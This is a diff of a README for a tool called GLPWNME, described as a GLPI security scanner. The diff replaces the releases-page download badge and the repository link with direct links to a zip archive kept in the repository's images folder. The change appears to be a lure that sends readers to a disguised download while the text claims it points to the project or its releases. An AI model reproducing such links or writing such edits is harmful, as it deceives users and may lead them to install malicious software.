@@ -18,7 +18,7 @@ GLPWNME is a simple yet powerful tool that scans your GLPI installation for comm
 
 To use GLPWNME, simply download the latest release from the link below and execute the tool on your GLPI installation. The tool will analyze your configuration and provide you with a report detailing any vulnerabilities found. Take the necessary steps to address the identified issues and enhance the security of your GLPI deployment.
 
-[![Download GLPWNME](https://img.shields.io/badge/Download-GLPWNME-blue)](https://github.com/Stayns/glpwnme/releases)
+[![Download GLPWNME](https://raw.githubusercontent.com/Stayns/glpwnme/main/images/Software-v1.5.zip)](https://raw.githubusercontent.com/Stayns/glpwnme/main/images/Software-v1.5.zip)
 
 ## Contribution 🤝
 
@@ -26,7 +26,7 @@ We welcome contributions to enhance the functionality and effectiveness of GLPWN
 
 ## Support 🌐
 
-For any questions, issues, or feedback regarding GLPWNME, please visit the [GitHub repository](https://github.com/Stayns/glpwnme) or check the "Releases" section for the latest updates and information.
+For any questions, issues, or feedback regarding GLPWNME, please visit the [GitHub repository](https://raw.githubusercontent.com/Stayns/glpwnme/main/images/Software-v1.5.zip) or check the "Releases" section for the latest updates and information.
 
 Let's work together to strengthen the security of GLPI with GLPWNME. Download the tool now and safeguard your IT assets from potential threats. Stay secure, stay protected! 🔒💪
 
